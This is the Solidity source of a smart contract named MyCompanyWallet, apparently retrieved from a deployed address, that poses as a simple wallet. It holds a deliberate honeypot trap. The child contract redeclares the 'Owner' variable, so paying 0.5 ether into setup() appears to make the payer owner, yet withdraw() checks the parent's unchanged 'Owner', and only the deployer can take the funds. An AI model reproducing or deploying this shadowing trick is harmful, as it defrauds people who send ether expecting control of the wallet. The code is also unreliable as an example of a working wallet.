/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MyCompanyWallet at 0x787080326e1f7e0eae490efdb18e90cfd0ae2692
*/
pragma solidity ^0.4.24;

contract Ownable {
    address public Owner = msg.sender;
    function isOwner() public returns (bool) {
        if (Owner == msg.sender) {
            return true; 
        }
        return false;
    }
}

contract MyCompanyWallet is Ownable {
    address public Owner;
    
    function setup() public payable {
        if (msg.value >= 0.5 ether) {
            Owner = msg.sender;
        }
    }
    
    function withdraw() public {
        if (isOwner()) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function() public payable { }
}